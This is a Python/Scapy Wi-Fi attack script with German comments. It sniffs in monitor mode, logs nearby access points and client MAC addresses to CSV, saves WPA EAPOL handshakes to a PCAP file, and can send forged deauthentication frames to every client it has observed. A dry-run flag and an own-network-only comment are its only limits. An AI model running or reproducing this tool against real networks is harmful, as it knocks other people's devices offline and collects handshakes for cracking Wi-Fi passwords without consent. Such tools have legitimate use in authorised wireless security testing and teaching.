#!/usr/bin/env python3
"""
Erweitertes WiFi-Scanning Script (aktualisiert mit robustem Monitor-Interface-Setup)
- Streaming PCAP (PcapWriter)
- AP/Client-Erkennung + CSV
- EAPOL/Handshake-Erkennung (heuristisch)
- Optional Deauth (--deauth --confirm), mit --dry-run
- Threaded sniffing + Locks
- Signal handling, RotatingFileHandler, argparse CLI
Hinweis: Deauth NUR im eigenen Testnetz verwenden.
"""

import os
import sys
import argparse
import logging
from logging.handlers import RotatingFileHandler
import csv
import threading
import signal
import subprocess
import time
from datetime import datetime
from scapy.all import (
    sniff, Dot11, Dot11Elt, Dot11Beacon, Dot11ProbeResp, EAPOL,
    RadioTap, Dot11Deauth, Dot11ProbeReq, sendp, wrpcap
)
from scapy.utils import PcapWriter

# ----------------------------
# Argumente / CLI
# ----------------------------
parser = argparse.ArgumentParser(description="WiFi scanner (capture, detect APs/clients, capture handshakes, optional deauth)")
parser.add_argument("--iface", "-i", default="mon0", help="Monitor interface (default mon0)")
parser.add_argument("--timeout", "-t", type=int, default=60, help="Initial scan timeout seconds (default 60)")
parser.add_argument("--pcap", default="/home/pi/wifi_capture.pcap", help="Output PCAP file for all packets")
parser.add_argument("--handshakes", default="/home/pi/handshakes.pcap", help="Output PCAP file for handshakes")
parser.add_argument("--csv-aps", default="/home/pi/wifi_aps.csv", help="CSV file for detected APs")
parser.add_argument("--csv-clients", default="/home/pi/wifi_clients.csv", help="CSV file for detected clients")
parser.add_argument("--deauth", action="store_true", help="Send deauth to detected clients of APs (DANGEROUS)")
parser.add_argument("--confirm", action="store_true", help="Confirm deauth (must be used with --deauth to actually send packets)")
parser.add_argument("--dry-run", action="store_true", help="If set, do not actually send deauth frames (only log what would be done)")
parser.add_argument("--debug", action="store_true", help="Enable debug log to stdout")
parser.add_argument("--rotatelogs", action="store_true", help="Enable rotating log file")
parser.add_argument("--logfile", default="/home/pi/wifi_edu.log", help="Log file path")
args = parser.parse_args()

INTERFACE = args.iface
TIMEOUT = args.timeout
PCAP_FILE = args.pcap
PCAP_HANDSHAKES = args.handshakes
CSV_APS = args.csv_aps
CSV_CLIENTS = args.csv_clients
DO_DEAUTH = args.deauth
DO_CONFIRM = args.confirm
DRY_RUN = args.dry_run
DEBUG = args.debug

# ----------------------------
# Root check
# ----------------------------
if os.geteuid() != 0:
    print("Dieses Script benötigt Root-Rechte. Bitte mit sudo ausführen.")
    sys.exit(1)

# ----------------------------
# Logging (Rotating optional)
# ----------------------------
logger = logging.getLogger("wifi_edu")
logger.setLevel(logging.DEBUG if DEBUG else logging.INFO)
fmt = logging.Formatter("%(asctime)s [%(levelname)s] %(message)s")
if args.rotatelogs:
    handler = RotatingFileHandler(args.logfile, maxBytes=5*1024*1024, backupCount=3)
else:
    handler = logging.FileHandler(args.logfile)
handler.setFormatter(fmt)
logger.addHandler(handler)
# also console if debug
if DEBUG:
    ch = logging.StreamHandler(sys.stdout)
    ch.setFormatter(fmt)
    logger.addHandler(ch)

logger.info("Script gestartet. Interface=%s timeout=%s deauth=%s confirm=%s dry-run=%s",
            INTERFACE, TIMEOUT, DO_DEAUTH, DO_CONFIRM, DRY_RUN)

# ----------------------------
# Utility / Validation
# ----------------------------
def is_valid_mac(mac):
    if not isinstance(mac, str):
        return False
    parts = mac.split(":")
    if len(parts) != 6:
        return False
    for p in parts:
        if len(p) != 2:
            return False
        try:
            int(p, 16)
        except ValueError:
            return False
    return True

def is_local_random(mac):
    # lokale administrierte MAC: üblicherweise mit 02:... beginnen
    if not isinstance(mac, str): return False
    return mac.lower().startswith("02:")

# ----------------------------
# CSV init
# ----------------------------
def init_csv(path, header):
    if not os.path.exists(path):
        try:
            with open(path, "w", newline="") as f:
                writer = csv.writer(f)
                writer.writerow(header)
            logger.info("CSV angelegt: %s", path)
        except Exception as e:
            logger.exception("Konnte CSV nicht anlegen: %s (%s)", path, e)

init_csv(CSV_APS, ["Timestamp","SSID","BSSID","Channel","Capabilities"])
init_csv(CSV_CLIENTS, ["Timestamp","Client MAC","Type","Target/AP or Requested SSID"])

# ----------------------------
# Shared structures + locks
# ----------------------------
aps = {}          # bssid -> (ssid, channel, capability)
clients = {}      # client_mac -> (type, target)
handshake_cache = {}  # (ap,client) -> set(hashes of eapol payloads)
handshake_packets = {} # (ap,client) -> list of packets to save
aps_lock = threading.Lock()
clients_lock = threading.Lock()
hs_lock = threading.Lock()

# ----------------------------
# Robustes Monitor-Interface Setup (wenn mon0 noch nicht existiert)
# ----------------------------
try:
    # Nur versuchen, wenn Interface nicht existiert
    if not os.path.exists(f"/sys/class/net/{INTERFACE}"):
        logger.info("Monitor-Interface %s existiert nicht. Versuche zu erstellen...", INTERFACE)
        try:
            # PHY herausfinden (versucht wlan0). Falls wlan0 nicht vorhanden, wird leer zurückgegeben.
            phy = subprocess.check_output(
                "iw dev wlan0 info | gawk '/wiphy/ {printf \"phy\" $2}'",
                shell=True, text=True
            ).strip()
            if not phy:
                # fallback: suche erstes phy
                try:
                    phy = subprocess.check_output("iw dev | awk '/wiphy/ {print \"phy\"$2; exit}'", shell=True, text=True).strip()
                except Exception:
                    phy = ""
            if phy:
                cmd_add = f"iw {phy} interface add {INTERFACE} type monitor"
                logger.debug("Ausführen: %s", cmd_add)
                try:
                    subprocess.run(cmd_add, shell=True, check=True)
                    logger.info("Monitor-Interface %s erfolgreich erstellt (phy=%s).", INTERFACE, phy)
                except subprocess.CalledProcessError as e:
                    logger.info("Erstellen des Monitor-Interfaces fehlgeschlagen oder bereits vorhanden: %s", e)
            else:
                logger.warning("Konnte PHY nicht ermitteln; Interface wurde nicht erstellt.")
        except subprocess.CalledProcessError as e:
            logger.info("Fehler beim Ermitteln/Erstellen des Monitor-Interfaces: %s", e)
    else:
        logger.debug("Interface %s existiert bereits, überspringe Erstellung.", INTERFACE)

    # Interface hochfahren (versuche, auch wenn es schon existiert)
    try:
        cmd_up = f"ip link set {INTERFACE} up"
        logger.debug("Ausführen: %s", cmd_up)
        subprocess.run(cmd_up, shell=True, check=True)
        logger.info("Interface %s ist jetzt up.", INTERFACE)
    except subprocess.CalledProcessError as e:
        logger.warning("Konnte Interface %s nicht hochfahren: %s", INTERFACE, e)

except Exception:
    logger.exception("Unerwarteter Fehler beim Erstellen/Aktivieren des Monitor-Interfaces.")

# ----------------------------
# Ensure interface exists (don't crash if not)
# ----------------------------
if not os.path.exists(f"/sys/class/net/{INTERFACE}"):
    logger.error("Interface %s existiert nicht. Prüfe Monitor Mode oder Interface Namen.", INTERFACE)
    sys.exit(1)

# ----------------------------
# PcapWriter (streaming)
# ----------------------------
try:
    pcap_writer = PcapWriter(PCAP_FILE, append=True, sync=True)
    logger.info("PcapWriter geöffnet: %s", PCAP_FILE)
except Exception as e:
    logger.exception("Konnte PcapWriter nicht öffnen: %s", e)
    sys.exit(1)

# ----------------------------
# packet_handler (thread-safe)
# ----------------------------
def packet_handler(pkt):
    # stream to pcap immediately
    try:
        pcap_writer.write(pkt)
    except Exception:
        logger.exception("Fehler beim Schreiben in PCAP")

    # debug summary
    if DEBUG:
        logger.debug(pkt.summary())

    # AP detection
    try:
        if pkt.haslayer(Dot11Beacon) or pkt.haslayer(Dot11ProbeResp):
            bssid = pkt.addr2
            if not bssid:
                return
            ssid = pkt[Dot11Elt].info.decode(errors="ignore") if pkt.haslayer(Dot11Elt) else "?"
            capability = pkt.sprintf("{Dot11Beacon:%Dot11Beacon.cap%}{Dot11ProbeResp:%Dot11ProbeResp.cap%}")
            try:
                channel = int(ord(pkt[Dot11Elt:3].info))
            except Exception:
                channel = "?"
            with aps_lock:
                if bssid not in aps:
                    aps[bssid] = (ssid, channel, capability)
                    logger.info("[AP] %s | BSSID=%s | CH=%s", ssid, bssid, channel)
                    # write CSV
                    try:
                        with open(CSV_APS, "a", newline="") as f:
                            writer = csv.writer(f)
                            writer.writerow([datetime.now(), ssid, bssid, channel, capability])
                    except Exception:
                        logger.exception("Fehler beim Schreiben APS CSV")
    except Exception:
        logger.exception("Fehler bei AP-Erkennung")

    # Clients & EAPOL
    try:
        if pkt.haslayer(Dot11):
            client_mac = pkt.addr2
            if not client_mac:
                return
            # ignore locally-generated flood MACs
            if is_local_random(client_mac):
                return

            # Probe Request
            if pkt.type == 0 and pkt.subtype == 4:
                requested_ssid = pkt[Dot11Elt].info.decode(errors="ignore") if pkt.haslayer(Dot11Elt) else ""
                with clients_lock:
                    if client_mac not in clients:
                        clients[client_mac] = ("Probe", requested_ssid)
                        logger.info("[Client Probe] %s -> requested=%s", client_mac, requested_ssid)
                        try:
                            with open(CSV_CLIENTS, "a", newline="") as f:
                                writer = csv.writer(f)
                                writer.writerow([datetime.now(), client_mac, "Probe", requested_ssid])
                        except Exception:
                            logger.exception("Fehler beim Schreiben Clients CSV (Probe)")

            # Data frames (likely real association)
            elif pkt.type == 2:
                ap_mac = pkt.addr1
                with clients_lock:
                    if client_mac not in clients:
                        clients[client_mac] = ("Data", ap_mac)
                        logger.info("[Client Data] %s -> AP=%s", client_mac, ap_mac)
                        try:
                            with open(CSV_CLIENTS, "a", newline="") as f:
                                writer = csv.writer(f)
                                writer.writerow([datetime.now(), client_mac, "Data", ap_mac])
                        except Exception:
                            logger.exception("Fehler beim Schreiben Clients CSV (Data)")

        # EAPOL / Handshake processing
        if pkt.haslayer(EAPOL):
            src = pkt.addr2
            dst = pkt.addr1
            # determine ap/client pair: prefer addr that is known AP in aps
            with aps_lock:
                maybe_ap = None
                maybe_client = None
                if dst in aps and src:
                    maybe_ap = dst
                    maybe_client = src
                elif src in aps and dst:
                    maybe_ap = src
                    maybe_client = dst
                else:
                    maybe_ap = dst
                    maybe_client = src
            if maybe_ap and maybe_client:
                key = (maybe_ap, maybe_client)
                raw = bytes(pkt.getlayer(EAPOL))
                h = hash(raw)
                with hs_lock:
                    if key not in handshake_cache:
                        handshake_cache[key] = set()
                        handshake_packets[key] = []
                    handshake_cache[key].add(h)
                    handshake_packets[key].append(pkt)
                    logger.info("[EAPOL] %s <-> %s (cached %d unique frames)", maybe_ap, maybe_client, len(handshake_cache[key]))
                    # heuristic: if we've seen 2+ unique EAPOL payloads, consider handshake captured
                    if len(handshake_cache[key]) >= 2:
                        try:
                            wrpcap(PCAP_HANDSHAKES, handshake_packets[key], append=True)
                            logger.info("[HANDSHAKE-SAVED] %s <-> %s saved to %s (%d pkts)", maybe_ap, maybe_client, PCAP_HANDSHAKES, len(handshake_packets[key]))
                        except Exception:
                            logger.exception("Fehler beim Speichern der Handshake-PCAP")
                        handshake_cache[key].clear()
                        handshake_packets[key].clear()
    except Exception:
        logger.exception("Fehler bei Client/EAPOL Verarbeitung")

# ----------------------------
# signal handler for graceful shutdown
# ----------------------------
stop_event = threading.Event()
def handle_signal(signum, frame):
    logger.info("Signal %s erhalten, beende sauber...", signum)
    stop_event.set()
    try:
        pcap_writer.close()
    except Exception:
        pass
    sys.exit(0)

signal.signal(signal.SIGINT, handle_signal)
signal.signal(signal.SIGTERM, handle_signal)

# ----------------------------
# sniff in thread
# ----------------------------
def run_sniffer():
    try:
        sniff(iface=INTERFACE, prn=packet_handler, store=0, timeout=TIMEOUT)
    except Exception:
        logger.exception("Sniffer-Abbruch")

sniff_thread = threading.Thread(target=run_sniffer, daemon=True)
sniff_thread.start()
logger.info("Sniffer-Thread gestartet (Dauer: %ds) ...", TIMEOUT)

# Wait for thread to finish
sniff_thread.join()

# close pcap writer
try:
    pcap_writer.close()
except Exception:
    pass

logger.info("Initialer Scan beendet. APs gefunden: %d | Clients gefunden: %d", len(aps), len(clients))

# ----------------------------
# Optional: perform deauth (safe with dry-run/confirm)
# ----------------------------
def perform_deauth(dry_run=True, confirm=False, count=5):
    """
    Sendet Deauth an alle Clients, die als 'Data' und deren target in aps stehen.
    dry_run=True => nur log, nicht senden.
    confirm must be True to actually send (extra protection).
    """
    if not DO_DEAUTH:
        logger.info("Deauth nicht aktiviert (--deauth nicht gesetzt)")
        return
    if not confirm:
        logger.warning("Deauth nicht bestätigt (--confirm fehlt). Nur Dry-Run.")
        dry_run = True

    targets = []
    with clients_lock:
        for client_mac, (ctype, target) in clients.items():
            if ctype == "Data" and target and is_valid_mac(target) and target in aps:
                targets.append((target, client_mac))
    if not targets:
        logger.info("Keine passenden Client-AP Paare für Deauth gefunden.")
        return

    for ap, client in targets:
        if dry_run:
            logger.info("[DRY-RUN] Deauth würde gesendet: %s -> %s (count=%d)", ap, client, count)
        else:
            pkt = RadioTap()/Dot11(addr1=client, addr2=ap, addr3=ap)/Dot11Deauth(reason=7)
            try:
                sendp(pkt, iface=INTERFACE, count=count, inter=0.1, verbose=1 if DEBUG else 0)
                logger.info("[DEAUTH-SENT] %s -> %s", ap, client)
            except Exception:
                logger.exception("Fehler beim Senden von Deauth")

# run deauth if requested
if DO_DEAUTH:
    perform_deauth(dry_run=DRY_RUN, confirm=DO_CONFIRM, count=5)

logger.info("Script beendet. PCAP: %s Handshakes: %s", PCAP_FILE, PCAP_HANDSHAKES)
